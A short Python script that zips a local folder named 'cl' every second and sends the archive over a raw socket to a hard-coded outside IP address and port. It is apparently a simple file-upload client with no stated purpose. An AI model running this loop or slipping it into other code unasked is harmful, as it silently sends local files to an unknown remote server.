import cv2
import os
import socket
import shutil
import time

host = "202.191.56.104"
port = 5518

while True:
    ss = socket.socket()

    try:
        ss.connect((host, port))
        connect = True
    except:
        connect = False
        print("Connection Fail !")

    shutil.make_archive("main", "zip", "cl")
    f = open(f"main.zip", 'rb')
    l = f.read()

    if connect:
        print(f'connected to {host}')
        # ss.send(f)
        ss.sendall(l)
    else:
        pass
    f.close()
    ss.close()
    time.sleep(1)
